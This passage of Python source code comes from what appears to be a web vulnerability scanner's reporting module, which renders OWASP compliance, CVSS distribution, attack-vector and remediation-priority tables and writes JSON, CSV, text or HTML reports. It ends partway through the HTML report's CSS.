        # Calculate compliance metrics
        affected_categories = len(data)
        total_owasp_categories = 10  # OWASP Top 10
        compliance_score = max(0, (total_owasp_categories - affected_categories) / total_owasp_categories * 100)
        most_problematic = data[0] if data else ('N/A', 0)
        
        compliance_table.add_row(
            "🛡️ Categories Affected", 
            f"{affected_categories}/10", 
            f"OWASP Top 10 categories with identified vulnerabilities"
        )
        compliance_table.add_row(
            "📊 Compliance Score", 
            f"{compliance_score:.0f}/100", 
            "Overall OWASP 2025 framework compliance rating"
        )
        compliance_table.add_row(
            "🎯 Most Problematic", 
            f"{most_problematic[0]}", 
            f"{owasp_descriptions.get(most_problematic[0], 'Unknown')} - {most_problematic[1]} issues"
        )
        
        # Overall compliance status
        if compliance_score >= 80:
            compliance_status = "[green]✅ EXCELLENT[/green]"
            compliance_desc = "Strong OWASP compliance with minimal security gaps"
        elif compliance_score >= 60:
            compliance_status = "[yellow]🔶 GOOD[/yellow]"
            compliance_desc = "Acceptable compliance level with room for improvement"
        elif compliance_score >= 40:
            compliance_status = "[orange1]⚠️ NEEDS WORK[/orange1]"
            compliance_desc = "Multiple OWASP categories affected - requires attention"
        else:
            compliance_status = "[red]🚨 CRITICAL[/red]"
            compliance_desc = "Poor OWASP compliance - comprehensive security review needed"
        
        compliance_table.add_row(
            "🏆 Overall Status", 
            compliance_status, 
            compliance_desc
        )
        
        self.console.print("\n")
        self.console.print(compliance_table)

    def _display_cvss_score_graph(self):
        """Display comprehensive CVSS score distribution with detailed risk analytics."""
        if not self.findings:
            return
            
        # Enhanced CVSS analysis with detailed score tracking
        cvss_ranges = {
            '0.0-2.0': {'count': 0, 'scores': [], 'types': set(), 'label': 'None/Low'},
            '2.1-4.0': {'count': 0, 'scores': [], 'types': set(), 'label': 'Low'},
            '4.1-6.0': {'count': 0, 'scores': [], 'types': set(), 'label': 'Medium'},
            '6.1-8.0': {'count': 0, 'scores': [], 'types': set(), 'label': 'High'},
            '8.1-10.0': {'count': 0, 'scores': [], 'types': set(), 'label': 'Critical'}
        }
        
        all_scores = []
        
        for finding in self.findings:
            cvss = finding.get('cvss_score', 0.0)
            vuln_type = finding.get('type', 'Unknown')
            all_scores.append(cvss)
            
            if cvss <= 2.0:
                cvss_ranges['0.0-2.0']['count'] += 1
                cvss_ranges['0.0-2.0']['scores'].append(cvss)
                cvss_ranges['0.0-2.0']['types'].add(vuln_type)
            elif cvss <= 4.0:
                cvss_ranges['2.1-4.0']['count'] += 1
                cvss_ranges['2.1-4.0']['scores'].append(cvss)
                cvss_ranges['2.1-4.0']['types'].add(vuln_type)
            elif cvss <= 6.0:
                cvss_ranges['4.1-6.0']['count'] += 1
                cvss_ranges['4.1-6.0']['scores'].append(cvss)
                cvss_ranges['4.1-6.0']['types'].add(vuln_type)
            elif cvss <= 8.0:
                cvss_ranges['6.1-8.0']['count'] += 1
                cvss_ranges['6.1-8.0']['scores'].append(cvss)
                cvss_ranges['6.1-8.0']['types'].add(vuln_type)
            else:
                cvss_ranges['8.1-10.0']['count'] += 1
                cvss_ranges['8.1-10.0']['scores'].append(cvss)
                cvss_ranges['8.1-10.0']['types'].add(vuln_type)
        
        # Filter out zero counts
        data = [(k, v) for k, v in cvss_ranges.items() if v['count'] > 0]
        
        if not data:
            return
        
        total_vulns = sum(range_data['count'] for _, range_data in data)
        
        self.console.print("\n")
        self.console.print(Panel(
            "[bold cyan]📈 Comprehensive CVSS v3.1 Score Distribution & Risk Analysis[/bold cyan]",
            style="cyan"
        ))
        
        # Create rich table for CVSS distribution
        from rich.table import Table
        
        cvss_table = Table(title="📊 CVSS v3.1 Risk Assessment", show_header=True, header_style="bold magenta")
        cvss_table.add_column("CVSS Range", style="bold", width=12)
        cvss_table.add_column("Risk Level", style="bold", width=12)
        cvss_table.add_column("Visual Distribution", width=35)
        cvss_table.add_column("Count", justify="center", width=8)
        cvss_table.add_column("Percentage", justify="center", width=12)
        cvss_table.add_column("Avg Score", justify="center", width=10)
        cvss_table.add_column("Types", justify="center", width=8)
        cvss_table.add_column("Impact Level", width=15)
        
        # Enhanced color mapping
        range_colors = {
            '0.0-2.0': 'green',
            '2.1-4.0': 'yellow',
            '4.1-6.0': 'orange1',
            '6.1-8.0': 'red',
            '8.1-10.0': 'magenta'
        }
        
        impact_indicators = {
            '0.0-2.0': '✅ Minimal',
            '2.1-4.0': '🔶 Low Impact',
            '4.1-6.0': '⚠️ Medium Impact',
            '6.1-8.0': '🚨 High Impact',
            '8.1-10.0': '💀 Critical Impact'
        }
        
        max_count = max(range_data['count'] for _, range_data in data) if data else 1
        
        for score_range, range_data in sorted(data, key=lambda x: float(x[0].split('-')[0])):
            count = range_data['count']
            percentage = (count / total_vulns) * 100
            avg_score = sum(range_data['scores']) / len(range_data['scores']) if range_data['scores'] else 0.0
            unique_types = len(range_data['types'])
            risk_label = range_data['label']
            impact = impact_indicators.get(score_range, 'Unknown')
            color = range_colors.get(score_range, 'white')
            
            # Create enhanced visual progress bar
            bar_percentage = int((count / max_count) * 32)
            filled_blocks = '█' * bar_percentage
            empty_blocks = '░' * (32 - bar_percentage)
            visual_bar = f"{filled_blocks}{empty_blocks}"
            
            cvss_table.add_row(
                f"[{color}]{score_range}[/{color}]",
                f"[{color}]{risk_label}[/{color}]",
                f"[{color}]{visual_bar}[/{color}]",
                f"[{color}]{count}[/{color}]",
                f"[{color}]{percentage:.1f}%[/{color}]",
                f"[{color}]{avg_score:.1f}[/{color}]",
                f"[{color}]{unique_types}[/{color}]",
                f"[{color}]{impact}[/{color}]"
            )
        
        self.console.print(cvss_table)
        
        # Enhanced statistical analysis table
        stats_table = Table(title="📈 Advanced Statistical Analysis", show_header=True, header_style="bold cyan")
        stats_table.add_column("Statistical Metric", style="bold yellow", width=25)
        stats_table.add_column("Value", style="bold white", width=15)
        stats_table.add_column("Risk Interpretation", style="cyan", width=50)
        
        # Calculate comprehensive statistics
        avg_cvss = sum(all_scores) / len(all_scores) if all_scores else 0.0
        min_cvss = min(all_scores) if all_scores else 0.0
        max_cvss = max(all_scores) if all_scores else 0.0
        score_range = max_cvss - min_cvss
        
        # Standard deviation
        if len(all_scores) > 1:
            variance = sum((x - avg_cvss) ** 2 for x in all_scores) / len(all_scores)
            std_dev = variance ** 0.5
        else:
            std_dev = 0.0
        
        # Risk distribution analysis
        high_risk = sum(range_data['count'] for score_range, range_data in data if float(score_range.split('-')[0]) >= 7.0)
        medium_risk = sum(range_data['count'] for score_range, range_data in data if 4.0 <= float(score_range.split('-')[0]) < 7.0)
        low_risk = total_vulns - high_risk - medium_risk
        
        stats_table.add_row(
            "📊 Average CVSS Score",
            f"{avg_cvss:.2f}/10.0",
            "Mean severity across all vulnerabilities"
        )
        stats_table.add_row(
            "📏 Score Range",
            f"{min_cvss:.1f} - {max_cvss:.1f}",
            f"Risk spread of {score_range:.1f} points"
        )
        stats_table.add_row(
            "📈 Standard Deviation",
            f"{std_dev:.2f}",
            "Score consistency - lower values indicate uniform risk levels"
        )
        stats_table.add_row(
            "🔴 High Risk (7.0+)",
            f"{high_risk} ({(high_risk/total_vulns)*100:.1f}%)",
            "Critical vulnerabilities requiring immediate remediation"
        )
        stats_table.add_row(
            "🟡 Medium Risk (4.0-6.9)",
            f"{medium_risk} ({(medium_risk/total_vulns)*100:.1f}%)",
            "Moderate vulnerabilities for scheduled remediation"
        )
        stats_table.add_row(
            "🟢 Low Risk (<4.0)",
            f"{low_risk} ({(low_risk/total_vulns)*100:.1f}%)",
            "Lower priority items for routine maintenance"
        )
        
        # Overall security posture
        if avg_cvss >= 7.0:
            posture = "[red]🚨 HIGH RISK[/red]"
            posture_desc = "Critical security intervention needed immediately"
        elif avg_cvss >= 4.0:
            posture = "[yellow]🔶 MODERATE RISK[/yellow]"
            posture_desc = "Active monitoring and planned remediation required"
        else:
            posture = "[green]✅ LOW RISK[/green]"
            posture_desc = "Acceptable risk profile with standard maintenance"
        
        stats_table.add_row(
            "�️ Security Posture",
            posture,
            posture_desc
        )
        
        self.console.print("\n")
        self.console.print(stats_table)

    def _display_attack_vector_graph(self):
        """Display comprehensive attack vector analysis with threat modeling insights."""
        if not self.findings:
            return
            
        # Enhanced attack vector analysis with detailed threat intelligence
        vector_data = {}
        vector_severity = {}
        vector_types = {}
        vector_complexity = {}
        
        for finding in self.findings:
            vector = finding.get('attack_vector', 'Unknown')
            severity = finding.get('severity', 'INFO')
            vuln_type = finding.get('type', 'Unknown')
            complexity = finding.get('exploit_difficulty', 'Unknown')
            
            if vector not in vector_data:
                vector_data[vector] = 0
                vector_severity[vector] = []
                vector_types[vector] = set()
                vector_complexity[vector] = []
            
            vector_data[vector] += 1
            vector_severity[vector].append(severity)
            vector_types[vector].add(vuln_type)
            vector_complexity[vector].append(complexity)
        
        if not vector_data:
            return
        
        total_vulnerabilities = sum(vector_data.values())
        data = sorted(vector_data.items(), key=lambda x: x[1], reverse=True)
        
        self.console.print("\n")
        self.console.print(Panel(
            "[bold cyan]🎯 Comprehensive Attack Vector & Threat Surface Analysis[/bold cyan]",
            style="cyan"
        ))
        
        # Create rich table for attack vector analysis
        vector_table = Table(title="🎯 Attack Vector Distribution & Threat Analysis", show_header=True, header_style="bold magenta")
        vector_table.add_column("Vector", style="bold", width=12)
        vector_table.add_column("Visual Distribution", style="cyan", width=35)
        vector_table.add_column("Count", style="bold", width=8)
        vector_table.add_column("Percentage", style="bold", width=10)
        vector_table.add_column("Threat Level", style="bold", width=10)
        vector_table.add_column("Types", style="bold", width=8)
        vector_table.add_column("Complexity", style="bold", width=12)
        vector_table.add_column("Risk Assessment", style="bold", width=15)
        
        vector_emojis = {
            'Network': '🌐',
            'Adjacent': '📡',
            'Local': '💻',
            'Physical': '🔧',
            'Unknown': '❓'
        }
        
        threat_levels = {
            'Network': 'HIGH',
            'Adjacent': 'MEDIUM',
            'Local': 'MEDIUM',
            'Physical': 'LOW',
            'Unknown': 'UNKNOWN'
        }
        
        risk_assessments = {
            'Network': '🔴 Remote',
            'Adjacent': '� Adjacent',
            'Local': '� Local',
            'Physical': '� Physical',
            'Unknown': '❓ Unknown'
        }
        
        max_count = max(count for _, count in data) if data else 1
        
        vector_colors = {
            'Network': 'red',
            'Adjacent': 'orange1',
            'Local': 'green',
            'Physical': 'blue',
            'Unknown': 'white'
        }
        
        for vector, count in data:
            percentage = (count / total_vulnerabilities) * 100
            color = vector_colors.get(vector, 'white')
            threat_level = threat_levels.get(vector, 'UNKNOWN')
            risk_assessment = risk_assessments.get(vector, '❓ Unknown')
            unique_types = len(vector_types[vector])
            
            # Calculate most common complexity
            complexities = vector_complexity[vector]
            most_common_complexity = max(set(complexities), key=complexities.count) if complexities else 'Unknown'
            
            # Create visual progress bar
            bar_percentage = int((count / max_count) * 32)
            filled_blocks = '▓' * bar_percentage
            empty_blocks = '░' * (32 - bar_percentage)
            visual_bar = f"{filled_blocks}{empty_blocks}"
            vector_emoji = vector_emojis.get(vector, '❓')
            
            vector_table.add_row(
                f"[{color}]{vector_emoji} {vector}[/{color}]",
                f"[{color}]{visual_bar}[/{color}]",
                f"[{color}]{count}[/{color}]",
                f"[{color}]{percentage:.1f}%[/{color}]",
                f"[{color}]{threat_level}[/{color}]",
                f"[{color}]{unique_types}[/{color}]",
                f"[{color}]{most_common_complexity}[/{color}]",
                f"[{color}]{risk_assessment}[/{color}]"
            )
        
        self.console.print(vector_table)
        
        # Threat analysis summary table
        threat_table = Table(title="🔍 Threat Surface Analysis", show_header=True, header_style="bold cyan")
        threat_table.add_column("Threat Metric", style="bold yellow", width=25)
        threat_table.add_column("Value", style="bold white", width=15)
        threat_table.add_column("Security Implications", style="cyan", width=50)
        
        # Calculate threat surface metrics
        network_vectors = sum(count for vector, count in data if vector == 'Network')
        local_vectors = sum(count for vector, count in data if vector in ['Local', 'Adjacent'])
        physical_vectors = sum(count for vector, count in data if vector == 'Physical')
        unknown_vectors = sum(count for vector, count in data if vector == 'Unknown')
        
        # Primary attack vector
        primary_vector = max(data, key=lambda x: x[1])[0] if data else 'Unknown'
        
        # Complexity assessment
        easy_exploits = sum(1 for complexities in vector_complexity.values() for c in complexities if c.lower() in ['easy', 'low'])
        
        threat_table.add_row(
            "🎯 Total Attack Vectors",
            str(len(data)),
            "Unique attack vector types identified in vulnerability set"
        )
        threat_table.add_row(
            "🌐 Remote Attack Surface",
            f"{network_vectors} ({(network_vectors/total_vulnerabilities)*100:.1f}%)",
            "Network-accessible vulnerabilities exposing remote attack surface"
        )
        threat_table.add_row(
            "💻 Local Attack Surface",
            f"{local_vectors} ({(local_vectors/total_vulnerabilities)*100:.1f}%)",
            "Local and adjacent network access required vulnerabilities"
        )
        threat_table.add_row(
            "🔧 Physical Attack Surface",
            f"{physical_vectors} ({(physical_vectors/total_vulnerabilities)*100:.1f}%)",
            "Physical access required for exploitation"
        )
        threat_table.add_row(
            "🎯 Primary Threat Vector",
            primary_vector,
            f"Most common attack vector requiring focused defensive measures"
        )
        threat_table.add_row(
            "⚡ Easy Exploitation",
            f"{easy_exploits} ({(easy_exploits/total_vulnerabilities)*100:.1f}%)",
            "Low-complexity vulnerabilities enabling rapid exploitation"
        )
        
        # Security posture assessment
        if network_vectors >= total_vulnerabilities * 0.7:
            threat_posture = "[red]🚨 HIGH THREAT[/red]"
            threat_desc = "Significant remote attack surface requiring immediate perimeter defense"
        elif network_vectors >= total_vulnerabilities * 0.3:
            threat_posture = "[orange1]⚠️ MODERATE THREAT[/orange1]"
            threat_desc = "Balanced threat surface requiring comprehensive security controls"
        else:
            threat_posture = "[green]🟢 LOW THREAT[/green]"
            threat_desc = "Limited remote exposure with primarily local attack vectors"
        
        threat_table.add_row(
            "🛡️ Threat Exposure",
            threat_posture,
            threat_desc
        )
        
        self.console.print("\n")
        self.console.print(threat_table)

    def _display_remediation_priority_graph(self):
        """Display comprehensive remediation priority analysis with resource planning."""
        if not self.findings:
            return
            
        # Enhanced remediation priority analysis
        priority_data = {}
        priority_effort = {}
        priority_timeline = {}
        priority_types = {}
        priority_business_impact = {}
        
        effort_mapping = {
            '🔴 URGENT': {'effort': 'High', 'timeline': '24-48 hours', 'business_impact': 'Critical'},
            '⚠️ HIGH': {'effort': 'Medium-High', 'timeline': '1-2 weeks', 'business_impact': 'High'},
            '🔶 MEDIUM': {'effort': 'Medium', 'timeline': '2-4 weeks', 'business_impact': 'Medium'},
            '🟢 LOW': {'effort': 'Low', 'timeline': '1-3 months', 'business_impact': 'Low'},
            '📋 INFO': {'effort': 'Minimal', 'timeline': 'Next cycle', 'business_impact': 'Minimal'}
        }
        
        for finding in self.findings:
            priority = self._calculate_remediation_priority(finding)
            vuln_type = finding.get('type', 'Unknown')
            severity = finding.get('severity', 'INFO')
            cvss = finding.get('cvss_score', 0.0)
            
            if priority not in priority_data:
                priority_data[priority] = 0
                priority_types[priority] = set()
            
            priority_data[priority] += 1
            priority_types[priority].add(vuln_type)
        
        # Filter out zero counts
        data = [(k, v) for k, v in priority_data.items() if v > 0]
        
        if not data:
            return
        
        total_issues = sum(priority_data.values())
        
        self.console.print("\n")
        self.console.print(Panel(
            "[bold cyan]🚀 Comprehensive Remediation Priority & Resource Planning[/bold cyan]",
            style="cyan"
        ))
        
        # Create rich table for remediation priority analysis
        priority_table = Table(title="🚀 Remediation Priority Distribution & Resource Planning", show_header=True, header_style="bold magenta")
        priority_table.add_column("Priority", style="bold", width=12)
        priority_table.add_column("Visual Distribution", style="cyan", width=42)
        priority_table.add_column("Count", style="bold", width=8)
        priority_table.add_column("Percentage", style="bold", width=10)
        priority_table.add_column("Timeline", style="bold", width=12)
        priority_table.add_column("Effort", style="bold", width=12)
        priority_table.add_column("Impact", style="bold", width=12)
        
        # Priority color mapping for rich table
        priority_colors = {
            '🔴 URGENT': 'red',
            '⚠️ HIGH': 'orange1',
            '🔶 MEDIUM': 'yellow',
            '🟢 LOW': 'green',
            '📋 INFO': 'blue'
        }
        
        max_count = max(count for _, count in data) if data else 1
        
        for priority, count in data:
            percentage = (count / total_issues) * 100
            color = priority_colors.get(priority, 'white')
            
            effort_info = effort_mapping.get(priority, {'effort': 'Unknown', 'timeline': 'Unknown', 'business_impact': 'Unknown'})
            timeline = effort_info['timeline']
            effort = effort_info['effort']
            business_impact = effort_info['business_impact']
            
            # Create visual progress bar
            bar_percentage = int((count / max_count) * 40)
            filled_blocks = '▓' * bar_percentage
            empty_blocks = '░' * (40 - bar_percentage)
            visual_bar = f"{filled_blocks}{empty_blocks}"
            
            priority_table.add_row(
                f"[{color}]{priority}[/{color}]",
                f"[{color}]{visual_bar}[/{color}]",
                f"[{color}]{count}[/{color}]",
                f"[{color}]{percentage:.1f}%[/{color}]",
                f"[{color}]{timeline}[/{color}]",
                f"[{color}]{effort}[/{color}]",
                f"[{color}]{business_impact}[/{color}]"
            )
        
        self.console.print(priority_table)
        
        # Create resource planning analytics table
        planning_table = Table(title="📋 Resource Planning & Timeline Analysis", show_header=True, header_style="bold cyan")
        planning_table.add_column("Planning Category", style="bold yellow", width=25)
        planning_table.add_column("Value", style="bold white", width=15)
        planning_table.add_column("Assessment", style="cyan", width=50)
        
        # Calculate values
        urgent_count = priority_data.get('🔴 URGENT', 0)
        high_count = priority_data.get('⚠️ HIGH', 0)
        medium_count = priority_data.get('🔶 MEDIUM', 0)
        low_count = priority_data.get('🟢 LOW', 0)
        info_count = priority_data.get('📋 INFO', 0)
        
        critical_business_impact = urgent_count + high_count
        total_effort_points = (urgent_count * 8) + (high_count * 5) + (medium_count * 3) + (low_count * 1) + (info_count * 0.5)
        high_risk_percentage = ((urgent_count + high_count) / total_issues) * 100 if total_issues > 0 else 0
        
        # Team requirement assessment
        if urgent_count > 0:
            team_requirement = "IMMEDIATE (critical vulnerabilities present)"
        elif high_count > 3:
            team_requirement = "HIGH (multiple high-priority issues)"
        else:
            team_requirement = "NORMAL (standard remediation cycle)"
        
        # Risk classification
        if high_risk_percentage >= 70:
            risk_classification = f"🚨 CRITICAL: {high_risk_percentage:.1f}% high-risk issues - Emergency response required"
        elif high_risk_percentage >= 40:
            risk_classification = f"⚠️ HIGH: {high_risk_percentage:.1f}% high-risk issues - Accelerated remediation needed"
        elif high_risk_percentage >= 20:
            risk_classification = f"🔶 MODERATE: {high_risk_percentage:.1f}% high-risk issues - Standard remediation timeline"
        else:
            risk_classification = f"✅ LOW: {high_risk_percentage:.1f}% high-risk issues - Maintenance-level effort"
        
        # Add rows to planning table
        planning_table.add_row(
            "⚡ Immediate Action Required",
            f"{urgent_count}",
            "24-48 hour SLA vulnerabilities requiring emergency response"
        )
        planning_table.add_row(
            "🚀 Short-term Planning",
            f"{high_count}",
            "1-2 weeks timeline for high-priority remediation"
        )
        planning_table.add_row(
            "📅 Medium-term Planning", 
            f"{medium_count}",
            "2-4 weeks timeline for medium-priority issues"
        )
        planning_table.add_row(
            "🔄 Long-term Planning",
            f"{low_count}",
            "1-3 months timeline for low-priority vulnerabilities"
        )
        planning_table.add_row(
            "📋 Maintenance Items",
            f"{info_count}",
            "Next development cycle for informational items"
        )
        planning_table.add_row(
            "� Critical Business Impact",
            f"{critical_business_impact}",
            f"Vulnerabilities requiring immediate attention ({critical_business_impact/total_issues*100:.1f}% of total)"
        )
        planning_table.add_row(
            "📊 Estimated Total Effort",
            f"{total_effort_points:.1f} pts",
            "Story points based on complexity and priority analysis"
        )
        planning_table.add_row(
            "👥 Security Team Required",
            team_requirement.split()[0],
            team_requirement
        )
        planning_table.add_row(
            "🎯 Risk Classification",
            risk_classification.split(':')[0],
            risk_classification
        )
        
        self.console.print("\n")
        self.console.print(planning_table)

    def _save_detailed_report(self):
        """Save comprehensive detailed report."""
        output_path = Path(self.config.args.output)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        file_format = self.config.args.format.lower()
        
        try:
            if file_format == 'json':
                # Enhanced JSON with all detailed information
                detailed_data = {
                    'scan_metadata': {
                        'timestamp': datetime.now().isoformat(),
                        'total_vulnerabilities': len(self.findings),
                        'security_posture': self._assess_security_posture(),
                        'statistics': self._calculate_comprehensive_stats()
                    },
                    'vulnerabilities': self.findings
                }
                with open(output_path, 'w') as f: 
                    json.dump(detailed_data, f, indent=4)
            
            elif file_format == 'csv' and self.df is not None: 
                self.df.to_csv(output_path, index=False)
            
            elif file_format == 'html': 
                self._generate_professional_html_report(output_path)
            
            elif file_format == 'text':
                with open(output_path, 'w') as f:
                    f.write("=== DETAILED VULNERABILITY ASSESSMENT REPORT ===\n\n")
                    for finding in self.findings:
                        f.write(f"Vulnerability Type: {finding.get('type', 'N/A')}\n")
                        f.write(f"Severity: {finding.get('severity', 'N/A')}\n")
                        f.write(f"CVSS Score: {finding.get('cvss_score', 'N/A')}\n")
                        f.write(f"Risk Score: {finding.get('risk_score', 'N/A')}\n")
                        f.write(f"OWASP Category: {finding.get('owasp_category', 'N/A')}\n")
                        f.write(f"CWE ID: {finding.get('cwe_id', 'N/A')}\n")
                        f.write(f"CVE References: {', '.join(finding.get('cve_references', []))}\n")
                        f.write(f"Impact: {finding.get('impact_description', 'N/A')}\n")
                        f.write(f"Business Impact: {finding.get('business_impact', 'N/A')}\n")
                        f.write(f"Remediation: {finding.get('remediation_steps', 'N/A')}\n")
                        f.write(f"Technical Details: {finding.get('technical_details', 'N/A')}\n")
                        f.write(f"Affected URL: {finding.get('url', 'N/A')}\n")
                        f.write(f"Discovery Method: {finding.get('discovery_method', 'N/A')}\n")
                        f.write("-" * 80 + "\n\n")
            
            if not self.config.args.quiet: 
                self.console.print(f"📄 [bold green]Detailed report saved:[/bold green] {output_path}")
        except Exception as e: 
            self.console.print(f"❌ [bold red]Error saving report:[/bold red] {e}")

    def _generate_professional_html_report(self, output_path):
        """Generate an industry-standard, professional HTML vulnerability assessment report."""
        try:
            # Calculate comprehensive statistics
            total_vulns = len(self.findings)
            severity_counts = {}
            attack_vectors = {}
            owasp_categories = {}
            
            for finding in self.findings:
                severity = finding.get('severity', 'Unknown').upper()
                severity_counts[severity] = severity_counts.get(severity, 0) + 1
                
                attack_vector = finding.get('attack_vector', 'Unknown')
                attack_vectors[attack_vector] = attack_vectors.get(attack_vector, 0) + 1
                
                owasp_cat = finding.get('owasp_category', 'Unknown')
                owasp_categories[owasp_cat] = owasp_categories.get(owasp_cat, 0) + 1
            
            # Get comprehensive scan metadata
            scan_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            target_url = getattr(self.config.args, 'url', 'Unknown')
            security_posture = self._assess_security_posture()
            
            # Get technical intelligence if available
            tech_stack = getattr(self, 'site_info', {})
            server_software = tech_stack.get('server_software', 'Unknown')
            ip_address = tech_stack.get('ip_address', 'Unknown')
            programming_language = tech_stack.get('programming_language', 'Unknown')
            cms_platform = tech_stack.get('cms_platform', 'Unknown')
            
            # Create industry-standard HTML template with Bungee font
            html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DuskProbe Security Assessment Report - {target_url}</title>
    <link href="https://fonts.googleapis.com/css2?family=Bungee:wght@400&family=Bungee+Shade&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        :root {{
            --primary-color: #1a1a2e;
            --secondary-color: #16213e;
            --accent-color: #0f3460;
            --highlight-color: #e94560;
            --success-color: #28a745;
            --warning-color: #ffc107;
            --danger-color: #dc3545;
            --info-color: #17a2b8;
            --light-bg: #f8f9fa;
            --dark-text: #2c3e50;
            --border-radius: 12px;
            --box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }}
        
        body {{
            font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
            line-height: 1.6;
            color: var(--dark-text);
            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #89c9fc 100%);
            min-height: 100vh;
            padding: 20px 0;
        }}
        
        .container {{
            max-width: 1400px;
            margin: 0 auto;
            padding: 0 20px;
        }}
        
        /* Header Section */
        .report-header {{
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: white;
            border-radius: var(--border-radius);
            padding: 40px;
            margin-bottom: 30px;
            box-shadow: var(--box-shadow);
            position: relative;
            overflow: hidden;
        }}
        
        .report-header::before {{
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 20"><defs><radialGradient id="a" cx="50%" cy="40%" r="50%"><stop offset="0%" stop-color="%23fff" stop-opacity=".1"/><stop offset="100%" stop-color="%23fff" stop-opacity="0"/></radialGradient></defs><rect width="100" height="20" fill="url(%23a)"/></svg>');
            opacity: 0.1;
        }}
        
        .header-content {{
            position: relative;
            z-index: 1;
        }}
        
        .report-title {{
            font-family: 'Bungee', cursive;
            font-size: 3.2em;
            margin-bottom: 15px;
            text-align: center;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }}
        
        .report-subtitle {{
            font-family: 'Bungee', cursive;
            font-size: 1.4em;
            text-align: center;
            margin-bottom: 30px;
            opacity: 0.9;
        }}
        
        .scan-metadata {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 30px;
        }}
        
        .metadata-card {{
            background: rgba(255, 255, 255, 0.1);
            border-radius: var(--border-radius);
            padding: 20px;
            backdrop-filter: blur(10px);
        }}
        
        .metadata-label {{
            font-weight: 600;
            opacity: 0.8;
            font-size: 0.9em;
            margin-bottom: 5px;
        }}
        
        .metadata-value {{
            font-size: 1.1em;
            font-weight: 700;
        }}
        
        /* Executive Summary */
        .executive-summary {{
            background: white;
            border-radius: var(--border-radius);
            padding: 35px;
            margin-bottom: 30px;
            box-shadow: var(--box-shadow);
        }}
        
        .section-title {{
            font-family: 'Bungee', cursive;
            font-size: 2em;
            color: var(--primary-color);
            margin-bottom: 25px;
            border-bottom: 4px solid var(--highlight-color);
            padding-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 15px;
        }}
        
        .summary-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 25px;
            margin-top: 30px;
        }}
        
        .summary-card {{
            background: linear-gradient(135deg, var(--light-bg), #ffffff);
            border-radius: var(--border-radius);
            padding: 25px;
            text-align: center;
            border: 2px solid transparent;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }}
        
        .summary-card:hover {{
            transform: translateY(-5px);
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
        }}
        
        .summary-card.critical {{
            border-color: var(--danger-color);
            background: linear-gradient(135deg, #fff5f5, #ffe6e6);
        }}
        
        .summary-card.high {{
            border-color: var(--warning-color);
            background: linear-gradient(135deg, #fffbf0, #fff4e6);
        }}
        
        .summary-card.medium {{
            border-color: var(--info-color);
            background: linear-gradient(135deg, #f0f9ff, #e6f3ff);
        }}
        
        .summary-card.low {{
            border-color: var(--success-color);
            background: linear-gradient(135deg, #f0fff4, #e6ffed);
        }}
        
        .summary-icon {{
            font-size: 3em;
            margin-bottom: 15px;
        }}
        
        .summary-title {{
            font-size: 1.1em;
            font-weight: 600;
            color: var(--dark-text);
            margin-bottom: 10px;
        }}
        
        .summary-value {{
            font-family: 'Bungee', cursive;
            font-size: 2.5em;
            font-weight: bold;
            margin-bottom: 10px;
        }}
        
        .summary-description {{
            font-size: 0.9em;
            color: #666;
            line-height: 1.4;
        }}
        
        /* Vulnerability Table */
        .vulnerabilities-section {{
            background: white;
            border-radius: var(--border-radius);
            padding: 35px;
            margin-bottom: 30px;
            box-shadow: var(--box-shadow);
        }}
        
        .vuln-table {{
            width: 100%;
            border-collapse: collapse;
            margin-top: 25px;
            background: white;
            border-radius: var(--border-radius);
            overflow: hidden;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
        }}
        
        .vuln-table th {{
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: white;
            padding: 18px 15px;
            text-align: left;
            font-weight: 600;
            font-family: 'Bungee', cursive;
            font-size: 0.9em;
        }}
        
        .vuln-table td {{
            padding: 15px;
            border-bottom: 1px solid #e9ecef;
            vertical-align: top;
        }}
        
        .vuln-table tr:nth-child(even) {{
            background-color: #f8f9fa;
        }}
        
        .vuln-table tr:hover {{
            background-color: #e3f2fd;
            transform: scale(1.01);
            transition: all 0.2s ease;
        }}
        
        .severity-badge {{
            padding: 8px 16px;
            border-radius: 25px;
            font-size: 0.8em;
            font-weight: bold;
            text-transform: uppercase;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }}
        
        .badge-critical {{
            background: linear-gradient(135deg, #dc3545, #c82333);
            color: white;
            box-shadow: 0 2px 10px rgba(220, 53, 69, 0.3);
        }}
        
        .badge-high {{
            background: linear-gradient(135deg, #fd7e14, #e55a00);
            color: white;
            box-shadow: 0 2px 10px rgba(253, 126, 20, 0.3);
        }}
        
        .badge-medium {{
            background: linear-gradient(135deg, #ffc107, #e0a800);
            color: #333;
            box-shadow: 0 2px 10px rgba(255, 193, 7, 0.3);
        }}
        
        .badge-low {{
            background: linear-gradient(135deg, #28a745, #1e7e34);
            color: white;
            box-shadow: 0 2px 10px rgba(40, 167, 69, 0.3);
        }}
        
        .badge-unknown {{
            background: linear-gradient(135deg, #6c757d, #545b62);
            color: white;
        }}
        
        /* Technical Intelligence Section */
        .tech-intelligence {{
            background: white;
            border-radius: var(--border-radius);
            padding: 35px;
            margin-bottom: 30px;
